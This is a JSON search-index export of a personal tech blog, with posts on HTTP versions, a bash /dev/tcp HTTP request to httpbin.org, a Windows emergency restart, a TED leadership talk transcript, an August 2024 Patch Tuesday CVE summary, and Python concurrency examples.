60% of web requests according to some estimates.\nHTTP 3 is still new but gaining ground. Big companies like Google and Cloud flare are leadings its adoption.\nThat\u0026rsquo;s a journey through HTTP evolution we\u0026rsquo;ve seen how it changed from HTTP 1\u0026rsquo;s simple model, to http 2\u0026rsquo;s multiplexing, and HTTP 3\u0026rsquo;s QUIC connections.\nThe web\u0026rsquo;s foundational protocols have adapted to our growing need for fast reliable online experiences.\n\u0026hellip;.\n(End)\nLinks # HTTP 1 Vs HTTP 2 Vs HTTP 3! by ByteByteGo. ","date":"2024-08-30 18:35","externalUrl":null,"permalink":"/posts/http123/","section":"posts","summary":"HTTP 1 Vs HTTP 2 Vs HTTP 3!","title":"HTTP Versions","type":"posts"},{"content":"","date":"2024-08-30 18:35","externalUrl":null,"permalink":"/categories/yt/","section":"categories","summary":"","title":"YT","type":"categories"},{"content":"","date":"2024-08-24 07:26","externalUrl":null,"permalink":"/tags/bash/","section":"tags","summary":"","title":"bash","type":"tags"},{"content":" This is an augment on writing BASH script to perform HTTP request (without using curl). In the last posts, \u0026ldquo;Creating TCP/UDP Socket with /bin/bash\u0026rdquo;, I\u0026rsquo;ve shown 4 usages on creating TCP socket using /bin/bash.\nCreating TCP/UDP Socket with /bin/bash 2023-02-28 22:40\u0026middot;415 words\u0026middot;2 mins Posts bash cli tcpip Using /bin/bash to create TCP/UDP socket for troubleshooting Here, I\u0026rsquo;ll be showing a more comprehensive way to perform HTTP request with Bash script, including return HTTP headers.\n#!/usr/bin/env bash PORT=80 HOST=\u0026#34;httpbin.org\u0026#34; exec 3\u0026lt;\u0026gt;/dev/tcp/$HOST/$PORT HDRS=( \u0026#39;GET /ip HTTP/1.1\u0026#39; \u0026#39;Host: $HOST\u0026#39; \u0026#39;Connection: close\u0026#39; \u0026#39;\u0026#39; ) printf \u0026#39;%s\\r\\n\u0026#39; \u0026#34;${HDRS[@]}\u0026#34; \u0026gt;\u0026amp;3 while read -r data \u0026lt;\u0026amp;3; do echo \u0026#34;recv: $data\u0026#34; done exec 3\u0026gt;\u0026amp;- And here is the output.\n$ ./bash_curl.sh recv: HTTP/1.1 200 OK recv: Date: Thu, 22 Aug 2024 15:14:54 GMT recv: Content-Type: application/json recv: Content-Length: 33 recv: Connection: close recv: Server: gunicorn/19.9.0 recv: Access-Control-Allow-Origin: * recv: Access-Control-Allow-Credentials: true recv: recv: { recv: \u0026#34;origin\u0026#34;: \u0026#34;115.164.33.158\u0026#34; recv: } $ Links # More options on sending HTTP request using BASH ","date":"2024-08-24 07:26","externalUrl":null,"permalink":"/posts/bash_http/","section":"posts","summary":"HTTP request without \u003ccode\u003ecurl\u003c/code\u003e.","title":"HTTP Request with Bash","type":"posts"},{"content":"","date":"2024-08-22 15:08","externalUrl":null,"permalink":"/tags/emerg/","section":"tags","summary":"","title":"emerg","type":"tags"},{"content":" Any unsaved data will be lost. Use this only as a last resort. There is an emergency restart option hidden in Windows OS. To activate it:\nPress ctrl+alt+del buttons. On the new sceen, hold down ctrl while click at the ⏻ (power) icon (at the bottom right). This bring will bring up the Emergency restart option. This might come in handy if you don\u0026rsquo;t have access to the power button for some reasons.\nThis is a slightly better option than forcing a hard shutdown by pressing the power reset button.\n","date":"2024-08-22 15:08","externalUrl":null,"permalink":"/posts/emergency_restart/","section":"posts","summary":"Emergency restart in Windows OS.","title":"Emergency Restart","type":"posts"},{"content":"","date":"2024-08-22 15:08","externalUrl":null,"permalink":"/tags/restart/","section":"tags","summary":"","title":"restart","type":"tags"},{"content":"","date":"2024-08-22 15:08","externalUrl":null,"permalink":"/tags/win10/","section":"tags","summary":"","title":"win10","type":"tags"},{"content":"","date":"2024-08-22 15:08","externalUrl":null,"permalink":"/tags/win11/","section":"tags","summary":"","title":"win11","type":"tags"},{"content":"","date":"2024-08-22 06:06","externalUrl":null,"permalink":"/tags/fallacy/","section":"tags","summary":"","title":"fallacy","type":"tags"},{"content":"","date":"2024-08-22 06:06","externalUrl":null,"permalink":"/tags/leadership/","section":"tags","summary":"","title":"leadership","type":"tags"},{"content":" 💡 Discover ideas worth spreading. 💡 This section is to share some of the excellent TED talk sessions that I enjoyed.\n","date":"2024-08-22 06:06","externalUrl":null,"permalink":"/tedtalk/","section":"TED Talks","summary":"","title":"TED Talks","type":"tedtalk"},{"content":"","date":"2024-08-22 06:06","externalUrl":null,"permalink":"/categories/tedtalk/","section":"categories","summary":"","title":"TEDTalk","type":"categories"},{"content":" Good leadership looks boring.\nGood Leader != Good Stories\nAre we celebrating the wrong leaders?\nWe tend to celebrate leaders for their dramatic words and actions in times of crisis — but we often overlook truly great leaders who avoid the crisis to begin with.\nHistorian Martin Gutmann challenges us to rethink what effective leadership actually looks like, drawing on lessons from the famed (but disaster-prone) explorer Ernest Shackleton.\nNotes # Here\u0026rsquo;re my notes after I watched the full video (with transcript) Are we celebrating the wrong leaders? by Martin Gutmann.\nMy notes:\nPeople often confuse a good story for good leadership. This leads us to celebrate leaders who are not truly effective. For example of polar explorers Ernest Shackleton and Roald Amundsen: Shackleton is often celebrated as a great leader, despite his many failures. Amundsen, on the other hand, is often overlooked, despite his many successes. We need to stop celebrating leaders who are simply good at telling stories, and start celebrating leaders who are actually effective. Suggestions:\nReimagining what a good leadership looks like. Ignore the \u0026ldquo;captains of crisis\u0026rdquo;. Celebrate those who mitigate drama. The action fallacy tricks us into celebrating the wrong leaders. And this comes with huge costs.\nCheck out the Shirky principle too.\nFallacy # Some action fallacy highlighted by Martin.\nWe see leadership potential in people who \u0026hellip;\nspeak more (regardless of what they say) appear confident (regardless of competence) are perpetually busy (regardless of what they\u0026rsquo;re doing) Appearing to be a good leader rather than actually being one behind the scenes is the patch to fame, bonus and promotion today.\nNobody ever gets credit for fixing problems that never happened.\nTranscript # 00:03 I would like to invite you on a little thought experiment. Let\u0026rsquo;s pretend that we\u0026rsquo;re going on a polar expedition together. All of you and me. And we need to hire a captain. And we have two resumes in front of us.\n00:21 One comes from a man who has already successfully achieved all four of the major polar goals: the North Pole and the South Pole, and the Northeast and the Northwest Passage. In fact, three of these, he was the first person to accomplish. Let\u0026rsquo;s call him candidate A.\n00:42 Candidate B is a man who set off for the Antarctic four times, three times as the man in charge, and every time resulted in failure, catastrophe or death. Who should we hire?\n01:02 (Laughter)\n01:04 It\u0026rsquo;s not meant to be a trick question. I think it\u0026rsquo;s obvious we want candidate A. He\u0026rsquo;s the man for the job. But, in reality, we often trick ourselves into hiring candidate B or someone like him.\n01:22 How do I know? Well, both of these men were real polar explorers who lived during the so-called Heroic Age of Polar exploration. And in the centuries since, one of them has been consistently celebrated as a leadership role model in best-selling books, blogs, documentaries, podcasts and an endless stream of social media posts.\n01:48 But surprisingly, shockingly, this is not candidate A, but candidate B, the very much disaster-prone Anglo-Irish explorer Ernest Shackleton. Meanwhile, candidate A, the Norwegian Roald Amundsen, by any metric the most successful polar explorer to have ever lived, has been largely forgotten. I did a quick search in my university\u0026rsquo;s library catalogue before this talk, and I found no fewer than 26 books that celebrate Shackleton\u0026rsquo;s leadership qualities. For Amundsen, I found four, two of which I wrote.\n02:35 (Laughter)\n02:39 What is going on here? Why are we obsessed with a mediocre, at best, leader and overlooking a truly gifted one?\n02:51 Well, I\u0026rsquo;m a historian who studies leadership, and I\u0026rsquo;m here to tell you we celebrate the wrong leaders. And not just in the realm of polar exploration. Have you heard of Toussaint Louverture? You probably discuss him around the coffee machines in the mornings. Maybe not, but you should. He was born an illiterate slave and rose to become one of the most influential revolutionaries ever and outsmarted the biggest empires of the day, including Napoleon\u0026rsquo;s. What about Frances Perkins? She was the pillar in US President Franklin Delano Roosevelt\u0026rsquo;s famous New Deal. We celebrate the wrong leaders.\n03:37 And this is not just an academic or a trivial insight. Leadership development today is a 60-billion-dollar industry. For good reason. We need leaders, right? All the challenges that we face today require people to work together, and this in turn requires somebody who can motivate them, inspire them, coordinate the work, deal with whatever hiccups might arise along the way.\n04:09 But for this reason, it\u0026rsquo;s important that we celebrate the right leaders because the leaders we celebrate are the leaders we learn from. And so in this sense, the leaders we celebrate have a direct impact on the success or as it may be, failure, of our greatest endeavors today.\n04:33 So why do we celebrate the wrong leaders? Sometimes it comes down to pure racism and sexism. We have a well-documented bias for associating leadership with white men. But there\u0026rsquo;s another culprit at work as well, what I like to call the action fallacy. Our mistaken belief that the best leaders are those who generate the most noise, action and sensational activity in the most dramatic circumstances.\n05:03 In other words, we confuse a good story for good leadership. But the two are not the same. As a matter of fact, very often, good leadership will result in a bad story. Let me explain.\n05:20 Imagine leadership for one moment, not as a polar explorer charting a new course or a CEO motivating her staff, but as the simple act of swimming across a river. And not just any river. Imagine a violent river with waves crashing together and rocks lurking somewhere below the surface. If a swimmer ventures in haphazardly, without being aware of his own capabilities or the currents, and nearly drowns, but splashes around wildly, fights with all his strength, and somehow miraculously manages to drag himself back to safety, those of us looking on, will notice him, and we will probably say, \u0026ldquo;Wow, what a guy! He really fought hard to get himself out of that crisis.\u0026rdquo;\n06:21 And if instead we have a swimmer who has studied the river for years and knows just where and when to enter the water and how to turn her body in subtle ways, and so lets the current carry her across, we probably won\u0026rsquo;t notice her. And if we do, we would probably say, \u0026ldquo;Meh, that looks pretty easy.\u0026rdquo;\n06:48 (Laughter)\n06:51 Shackleton and Amundsen are a case in point. Shackleton, our candidate B, is best known for his ill-fated “Endurance” expedition, which set off in the summer of 1914 and saw his ship become trapped and eventually crushed by the ice off Antarctica. And he and his men were then forced to undertake a dangerous trek across the ice and braved some of the stormiest seas on Earth before finally reaching the safety of South Georgia in the summer of 1916.\n07:22 Now, Shackleton was a tenacious man, no doubt, and his is a captivating story fit for Hollywood. In fact, it was made into a TV series starring a young Kenneth Branagh. But, it is not a story fit to draw leadership lessons from. Because admirable those efforts were, the crisis that beset him was largely self-inflicted. He overlooked the advice from local whalers, who told him the ice was particularly dangerous that season, and he overlooked massive deficits in his equipment, preparation, crew selection and training.\n08:06 And it gets worse. Rarely highlighted in the many books that celebrate his leadership qualities is the fact that the expedition\u0026rsquo;s other ship, the Aurora, suffered an even graver crisis, the result of which was three lost lives.\n08:25 In contrast, the expeditions of Roald Amundsen make for boring reading. Not because he was lucky, but because, based on his intimate knowledge of the polar environment, his careful and deliberate planning, and his authentic and innovative leadership in the field, he managed to reduce the problems that his team encountered to a bare minimum.\n08:51 In 1905, he achieved, in a tiny fishing vessel, what the mighty British Navy had failed to do the previous eight decades: to find and navigate the Northwest Passage above the Canadian mainland. In 1911, he reached the South Pole, a journey of 3,000 kilometers across hazardous and uncharted terrain, and arrived back at his camp after 99 days, just one day off his planned schedule.\n09:24 If Shackleton is the swimmer who rushes recklessly into the water without understanding the currents or his own capabilities, Amundsen is the swimmer who has spent a lifetime humbly studying the river before entering the water in just the right spot, at just the right time, and so makes it look easy.\n09:47 Now the action fallacy causes real problems, and not just for our interpretation of the past. right? I arrived at it through my work as a historian interested in why we celebrate some leaders of the past, but not others. But it\u0026rsquo;s a dangerous feature in our offices today as well, because after all, the same biases and misconceptions that we bring to our reading of the past are one and the same with which we view leadership in our offices today.\n10:19 It is the Shackletons of our offices rather than the Amundsens, who serve as role models, who get promoted and who get rewarded. In fact, this is something studies in organizational psychology have confirmed. We see leadership potential in people who speak more, regardless of what they say.\n10:40 (Laughter)\n10:42 In people who appear confident, regardless of how competent they are. And we have an unyielding admiration for people who are perpetually busy, regardless of what they\u0026rsquo;re actually doing.\n10:57 I see some of you are imagining specific people in your office right now. Don\u0026rsquo;t worry, we won\u0026rsquo;t tell them.\n11:04 In other words, appearing to be a good leader, rather than actually being one behind the scenes, is the path to fame and bonus and promotion today. And this causes all kinds of problems. With the wrong leaders in charge, organizations are obviously not performing at their full potential. And it creates a toxic culture in which those actually doing good work feel overlooked and demotivated. And perhaps worst of all, it\u0026rsquo;s a self-perpetuating cycle because by celebrating these flawed, action-oriented leaders, we\u0026rsquo;re actively creating more of them. So this is a problem that we need to solve.\n11:47 The good news is we can. And it starts with reimagining what good leadership looks like. And there\u0026rsquo;s two sides to this. First, we have to learn to ignore what we can call the captains of crisis, the Shackletons, those who are lurching from one dramatic circumstance to another. While some crises can\u0026rsquo;t be avoided, many are self-inflicted or amplified by poor leadership, or sometimes just a figment of their imagination.\n12:19 Keith Grint, the preeminent scholar of leadership today, brilliantly summarizes this problematic dynamic. \u0026ldquo;Since we reward people who are good in crises, and ignore people who are such good managers that there are few crises, people soon learn to seek out or reframe situations as crises.\u0026rdquo; We need to disincentivize this style of leadership by refusing to give these people the attention they crave. And that\u0026rsquo;s easy when we\u0026rsquo;re confronted with the sober facts. Ahmanson\u0026rsquo;s four successes, Shackleton\u0026rsquo;s four failures. But as soon as it\u0026rsquo;s embedded in a story, the dramatic details pull us in like a magnet and give us a false sense of inspiration. False, because there\u0026rsquo;s no real substance there.\n13:08 Instead, we need to learn to celebrate those who mitigate rather than promote drama. And this can be challenging because often they do so in very subtle ways below the surface of the water, in the case of our swimmer, right? They\u0026rsquo;re obsessive planners. They build processes that align the organization\u0026rsquo;s strengths with the unique challenges they face. And they\u0026rsquo;re authentic and create cultures that bring out the best in people.\n13:37 Harvard Business School professor Raffaella Sadun has studied the profound impact this behind-the-scenes work can have, and she has given it a name. I don\u0026rsquo;t want to give you too many technical, academic terms here, but this is an important one, she calls it boring management.\n13:56 (Laughter)\n13:58 But as she tells us from her research, the evidence is clear that boring management matters. It may not be as exciting as leading a cavalry charge from the front or giving a brash pep talk, but it\u0026rsquo;s the real toolkit of good leaders.\n14:18 And to me, making a difference from behind the scenes, unconcerned with what other people are thinking, unconcerned with spilling self-aggrandizing words, or exaggerating, such people are truly inspirational. Let me summarize.\n14:40 The action fallacy tricks us into celebrating the wrong leaders. And this comes with huge costs. We can overcome it. I would say we must overcome it. And this starts with reimagining what good leadership looks like. So the next time you’re in a position to judge or reward a leader, or maybe just the next time you\u0026rsquo;re trying to figure out whose efforts actually guided your team or organization to success, resist the temptation to be dazzled by tales of adventure and derring-do, and take a moment to look below the surface or in the quieter corners of your team.\n15:24 And this is important, because the next time your organization is faced with the equivalent of the ice pack looming on the horizon, who do you want in charge? The leader who responds to the ship freezing in place by frantically cranking the engine, unpacking the crates of dynamite, and pushing his men to their breaking point? Or the leader who avoids getting stuck in the ice in the first place?\n15:53 Thank you.\n15:54 (Applause)\n","date":"2024-08-22 06:06","externalUrl":null,"permalink":"/tedtalk/incompetent_leaders/","section":"TED Talks","summary":"Rethink what great leadership looks like.","title":"Why do we celebrate incompetent leaders?","type":"tedtalk"},{"content":" This video summarizes the security updates released by Microsoft on August 13, 2024. Key Takeways # 102 newly disclosed vulnerabilities, slightly above average. Highest scored vulnerability is 9.8. 29 remote code execution vulnerabilities (around average). 6 publicly disclosed vulnerabilities (higher than average). 6 vulnerabilities known to be exploited (higher than average). Windows 11 version 24H2 has security updates but is not yet generally available. Total of 99 CVEs that require customer action. (New metric starting in Aug 2024) Highlights # CVE-2024-38063: Critical remote code execution in TCP/IP stack, no known exploits, base score 9.8, mitigated by disabling IPv6. CVE-2024-3819: Important remote code execution in line printer daemon, publicly disclosed, no known exploits, base score 9.8, mitigated by disabling line printer daemon. CVE-2024-38106: Important elevation of privilege in Windows kernel, privately disclosed but exploited in the wild, base score 7.0. Patch_Tuesday # $ ./patch_tuesday.py -k 2024-aug -vc _____ _ _ _____ _ | _ |___| |_ ___| |_ |_ _|_ _ ___ ___ _| |___ _ _ | __| .\u0026#39;| _| _| | | | | | | -_|_ -| . | .\u0026#39;| | | |__| |__,|_| |___|_|_| |_| |___|___|___|___|__,|_ | |___| [*] Finish fetching [2,953,270 bytes] from https://api.msrc.microsoft.com/cvrf/v3.0/cvrf/2024-aug [*] CISA Catalog of Known Exploited Vulnerabilities [ 2024.08.15/1150 ] Microsoft Patch Tuesday - By MSRC =============================================== \u0026lt;\u0026lt; August 2024 Security Updates [ 2024-08-13 ] \u0026gt;\u0026gt; [+] Vulnerabilities : [ 102 ] [-] High_Severity : [ 21 ] [-] High_likelihood : [ 11 ] [-] Exploited in_wild : [ 6 ] [-] Action_required : [ 99 ] [-] Found in CISA_KEV : [ 6 ] High_Severity/21 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2022-2601 │ B:8.6/T:8.6 │ Redhat: CVE-2022-2601 grub2 - Buffer overflow in grub_font_construct_glyph() can │ │ │ │ lead to out-of-bound write and possible secure boot bypass │ │ CVE-2024-38108 │ B:9.3/T:8.1 │ Azure Stack Hub Spoofing Vulnerability │ │ CVE-2024-38159 │ B:9.1/T:7.9 │ Windows Network Virtualization Remote Code Execution Vulnerability │ │ CVE-2024-38160 │ B:9.1/T:7.9 │ Windows Network Virtualization Remote Code Execution Vulnerability │ │ CVE-2024-38199 │ B:9.8/T:8.5 │ Windows Line Printer Daemon (LPD) Service Remote Code Execution Vulnerability │ │ CVE-2024-38063 │ B:9.8/T:8.5 │ Windows TCP/IP Remote Code Execution Vulnerability │ │ CVE-2024-38114 │ B:8.8/T:7.7 │ Windows IP Routing Management Snapin Remote Code Execution Vulnerability │ │ CVE-2024-38115 │ B:8.8/T:7.7 │ Windows IP Routing Management Snapin Remote Code Execution Vulnerability │ │ CVE-2024-38116 │ B:8.8/T:7.7 │ Windows IP Routing Management Snapin Remote Code Execution Vulnerability │ │ CVE-2024-38121 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution │ │ │ │ Vulnerability │ │ CVE-2024-38128 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution │ │ │ │ Vulnerability │ │ CVE-2024-38130 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution │ │ │ │ Vulnerability │ │ CVE-2024-38131 │ B:8.8/T:7.7 │ Clipboard Virtual Channel Extension Remote Code Execution Vulnerability │ │ CVE-2024-38140 │ B:9.8/T:8.5 │ Windows Reliable Multicast Transport Driver (RMCAST) Remote Code Execution │ │ │ │ Vulnerability │ │ CVE-2024-38144 │ B:8.8/T:7.7 │ Kernel Streaming WOW Thunk Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38154 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution │ │ │ │ Vulnerability │ │ CVE-2024-38180 │ B:8.8/T:7.7 │ Windows SmartScreen Security Feature Bypass Vulnerability │ │ CVE-2024-38189 │ B:8.8/T:8.2 [K] │ Microsoft Project Remote Code Execution Vulnerability │ │ CVE-2024-38120 │ B:8.8/T:7.7 │ Windows Routing and Remote Access Service (RRAS) Remote Code Execution │ │ │ │ Vulnerability │ │ CVE-2024-38206 │ B:8.5/T:7.4 │ Microsoft Copilot Studio Information Disclosure Vulnerability │ │ CVE-2024-38109 │ B:9.1/T:7.9 │ Azure Health Bot Elevation of Privilege Vulnerability │ └────────────────┴─────────────────┴───────────────────────────────────────────────────────────────────────────────────┘ High_Likelihood/11 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-38196 │ B:7.8/T:6.8 │ Windows Common Log File System Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38198 │ B:7.5/T:6.5 │ Windows Print Spooler Elevation of Privilege Vulnerability │ │ CVE-2024-38063 │ B:9.8/T:8.5 │ Windows TCP/IP Remote Code Execution Vulnerability │ │ CVE-2024-38125 │ B:7.8/T:6.8 │ Kernel Streaming WOW Thunk Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38133 │ B:7.8/T:6.8 │ Windows Kernel Elevation of Privilege Vulnerability │ │ CVE-2024-38141 │ B:7.8/T:6.8 │ Windows Ancillary Function Driver for WinSock Elevation of Privilege Vulnerability │ │ CVE-2024-38144 │ B:8.8/T:7.7 │ Kernel Streaming WOW Thunk Service Driver Elevation of Privilege Vulnerability │ │ CVE-2024-38147 │ B:7.8/T:6.8 │ Microsoft DWM Core Library Elevation of Privilege Vulnerability │ │ CVE-2024-38148 │ B:7.5/T:6.5 │ Windows Secure Channel Denial of Service Vulnerability │ │ CVE-2024-38150 │ B:7.8/T:6.8 │ Windows DWM Core Library Elevation of Privilege Vulnerability │ │ CVE-2024-38163 │ B:7.8/T:6.8 │ Windows Update Stack Elevation of Privilege Vulnerability │ └────────────────┴────────────────┴────────────────────────────────────────────────────────────────────────────────────┘ Exploited_in_Wild/6 ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ CVE ┃ CVSS_Base/Temp ┃ Title_Value ┃ ┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩ │ CVE-2024-38178 │ B:7.5/T:7.0 [K] │ Scripting Engine Memory Corruption Vulnerability │ │ CVE-2024-38193 │ B:7.8/T:7.2 [K] │ Windows Ancillary Function Driver for WinSock Elevation of Privilege │ │ │ │ Vulnerability │ │ CVE-2024-38213 │ B:6.5/T:6.0 [K] │ Windows Mark of the Web Security Feature Bypass Vulnerability │ │ CVE-2024-38106 │ B:7.0/T:6.5 [K] │ Windows Kernel Elevation of Privilege Vulnerability │ │ CVE-2024-38107 │ B:7.8/T:7.2 [K] │ Windows Power Dependency Coordinator Elevation of Privilege Vulnerability │ │ CVE-2024-38189 │ B:8.8/T:8.2 [K] │ Microsoft Project Remote Code Execution Vulnerability │ └────────────────┴─────────────────┴───────────────────────────────────────────────────────────────────────────────────┘ [+] Product Families (9) Windows ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇ 29 Azure ▇▇▇▇▇▇▇▇▇▇ 19 Microsoft Office ▇▇▇▇▇▇▇▇▇▇ 18 ESU ▇▇▇▇▇ 10 Mariner ▇▇▇ 6 Developer Tools ▇▇▇ 6 Microsoft Dynamics ▇ 2 Browser ▇ 1 Apps ▇ 1 [*] \u0026#34;August 2024 Security Updates\u0026#34; (Rev 92) [-] Initial Release date: 2024-08-13T07:00:00 [-] Current Release date: 2024-08-18T00:00:00 [*] [2024-08-19] main(): Completed within [8.8423 sec]. Outro # Tool: Patch_Tuesday at GitHub. Tool: CISA KEV Catalog at GitHub. ","date":"2024-08-15 15:36","externalUrl":null,"permalink":"/posts/2024_aug/","section":"posts","summary":"$ ./patch_tuesday.py -k 2024-aug -vc","title":"Patch Tuesday (2024-08)","type":"posts"},{"content":"","date":"2024-08-01 21:37","externalUrl":null,"permalink":"/tags/book/","section":"tags","summary":"","title":"book","type":"tags"},{"content":" [📚] How to Fail at Almost Everything and Still Win Big: Kind of the Story of My Life This is a 2013 non-fiction book by Scott Adams, the creator of Dilbert.\nAnd, here are the 5 great life lessons from the book:\nHave A System, Not A Goal. Success Creates Passion More Than Passion Creates Success. Focus On Energy, Not Time. Fake It Until You Make It. Increase Your Happy Thoughts Ratio. Links # How to Fail at Almost Everything and Still Win Big ","date":"2024-08-01 21:37","externalUrl":null,"permalink":"/notes/life_lesson/","section":"notes","summary":"Five great life lessons from Scott Adams\u0026rsquo;s book.","title":"Five Great Life Lessons","type":"notes"},{"content":"","date":"2024-08-01 21:37","externalUrl":null,"permalink":"/tags/lesson/","section":"tags","summary":"","title":"lesson","type":"tags"},{"content":"","date":"2024-07-26 09:25","externalUrl":null,"permalink":"/tags/sysadm/","section":"tags","summary":"","title":"sysadm","type":"tags"},{"content":" July 26, 2024 – 25th Annual SysAdm # Systems Administrator Appreciation Day (SysAdmin Day) is a day to pay tribute to the heroic men and women who prevent IT disasters, keep data secure, and ensure your computer runs without issues.\nThe holiday takes place each year on the last Friday in July. SysAdmin Day was first celebrated in the year 2000. $ ncal -b -H 2024-07-26 07 2024 July 2024 Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25\u0026lt;26\u0026gt;27 28 29 30 31 Links # The official System Administrator Appreciation Day website ","date":"2024-07-26 09:25","externalUrl":null,"permalink":"/posts/sysadm25/","section":"posts","summary":"2024 Systems Administrator Appreciation Day.","title":"SysAdm Day","type":"posts"},{"content":" First thing first: concurrent.futures != asyncio While they both deal with asynchronous programming, they employ different approaches and are suited to different types of tasks.\nTo be clear, they\u0026rsquo;re both limited by Global Interpreter Lock (GIL) and are both single process, multi-thread. They are both forms of concurrency but not parallelism.\nI used to be using concurrent.futures until I learnt asyncio.\nUsing concurrent.futures # There are 2 ways to use concurrent.futures:\nThreadPoolExecutor - Best used for I/O-bound tasks (such as file reading and network request). ProcessPoolExecutor - Suitable for CPU-intensive tasks (such as math computations). Let\u0026rsquo;s see 2 examples here. Here\u0026rsquo;s the sample on ThreadPoolExecutor():\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- from rich import print as rprint from timeit import default_timer as timer import concurrent.futures import requests def timeit(func): def timed(*args, **kwargs): stime = timer() result = func(*args, **kwargs) etime = timer() rprint(f\u0026#39;\\n [*] {func.__name__}(): completed within [{etime-stime:.4f} sec].\\n \u0026#39;) return result return timed def fetch_url(url): resp = requests.get(url) return url, resp.status_code, resp.elapsed.total_seconds() @timeit def singlethread(): for url in urls: _, status_code, elapsed = fetch_url(url) rprint(f\u0026#34;URL: {url} [ {status_code} / {elapsed:.4f} ]\u0026#34;) @timeit def multithread(): with concurrent.futures.ThreadPoolExecutor() as executor: futures = [executor.submit(fetch_url, url) for url in urls] for future in concurrent.futures.as_completed(futures): url, status_code, elapsed = future.result() rprint(f\u0026#34;URL: {url} [ {status_code} / {elapsed:.4f} ]\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: urls = [ \u0026#34;https://www.bing.com\u0026#34;, \u0026#34;https://www.duckduckgo.com\u0026#34;, \u0026#34;https://www.google.com\u0026#34;, \u0026#34;https://www.yahoo.com\u0026#34; ] print(f\u0026#39;\u0026#39;) singlethread() multithread() Here is the output:\nHere\u0026rsquo;s the sample on PorcessPoolExecutor():\n#!/usr/bin/env python3 # -*- coding: utf-8 -*- from rich import print as rprint from timeit import default_timer as timer import concurrent.futures import time def timeit(func): def timed(*args, **kwargs): stime = timer() result = func(*args, **kwargs) etime = timer() rprint(f\u0026#39;\\n [*] {func.__name__}(): completed within [{etime-stime:.4f} sec].\\n \u0026#39;) return result return timed def my_function(x): time.sleep(2) return x, x * x @timeit def without_executor(numbers): results = [] for num in numbers: start_time = time.time() x, result = my_function(num) end_time = time.time() print(f\u0026#34;Without_executor: {x} squared = {result} [ {end_time - start_time:.2f} sec ]\u0026#34;) results.append(result) return results @timeit def with_executor(numbers): with concurrent.futures.ProcessPoolExecutor() as executor: results = [executor.submit(my_function, num) for num in numbers] for f in concurrent.futures.as_completed(results): x, result = f.result() print(f\u0026#34;With_executor: {x} squared = {result} \u0026#34;) return results if __name__ == \u0026#34;__main__\u0026#34;: numbers = [2, 3, 4] print(f\u0026#39;\u0026#39;) without_executor(numbers) with_executor(numbers) Here is the output:\nKey Differences # Feature concurrent.futures asyncio Underlying mechanism Threads/Processes Event-loop Best suited CPU-bounded tasks I/O-bound tasks Complexity Simpler More complex Control over execution less granular more granular concurrent.futures # Uses threads or processes to execute tasks concurrently. Better suited for CPU-bound tasks by leveraging multiple cores. Simpler to use than asyncio for basic concurrent operations. asyncio # Uses an event-loop to manage asynchronous tasks. Execellent for I/O-bound tasks like network requests, file operations, etc. Offer fine-grained control over task scheduling and execution. Requires a deeper understanding of asynchronous programming concepts. Summary # concurrent.futures is like having multiple workers to handle tasks independently. If you have multiple CPU-intensive tasks that can benefits from parallel execution, use concurrent.futures.\nit uses time-slicing model by allocates slot of CPU time to all threads.. with many blocking threads (for long period), it begins to degrade into polling. Time-slicing is managed by the OS, giving the programmer less control over thread scheduling. asyncio is like having a single worker that can efficiently juggle multiple tasks without blocking. If you have many I/O-bound tasks that need to be handled efficiently without blocking the main thread, use asyncio.\nit uses an event-loop, and is more akin to push-notification model. it works by waiting for it to announce it\u0026rsquo;s availability (not checking the threads). Event-loop which based on polling/interrupt as core mechanism, continuous checks (pools) for I/O events or task completion. This makes asyncio offers more efficient for I/O-bound tasks, as it avoids unnecessary CPU usage when tasks are waiting for I/O. ","date":"2024-07-21 22:35","externalUrl":null,"permalink":"/posts/asyncio/concurrent/","section":"posts","summary":"Run numerous tasks concurrently via multi-thread and multi-process.","title":"About Concurrent.futures()","type":"posts"},{"content":"","date":"2024-07-21 22:35","externalUrl":null,"permalink":"/tags/concurrent/","section":"tags","summary":"","title":"concurrent","type":"tags"},{"content":"","date":"2024-07-21 22:35","externalUrl":null,"permalink":"/tags/thread/","section":"tags","summary":"","title":"thread","type":"tags"},{"content":"","date":"2024-07-21 